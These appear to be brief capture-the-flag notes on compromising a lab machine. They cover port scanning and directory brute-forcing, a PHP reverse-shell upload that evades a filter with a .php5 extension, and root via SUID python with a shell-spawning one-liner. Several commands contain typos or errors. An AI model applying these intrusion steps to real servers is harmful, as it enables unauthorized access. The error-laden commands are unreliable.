ip adress : 10.10.234.144

scan with nmap -a 
	=> 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	=> 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

gobuster : 
/uploads
/css
/js
/panel => used for upload folder

try to get a reverse shel => it's apache so php ! 
in order to bypass php security, the file could end like .php5

find a reverse shell for php and try to upload in the website.
launch a home server with nc -nlap 1337 port for listen 
dl a php-reverse-shell and modify ip with my ip : ifconfig command
go to /updates

clic to my file
after try to find the flag with cli find find / -type f -name  user.txt
after just need to cat the path /var/www/user.txt

after try to be root. find files with suid permission : /usr/bin/python
search for privilege escalation and when in the good repo, try some cli like : ./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
after being root, do whoima for being sure. 
do cat root/root.txt and catch the flag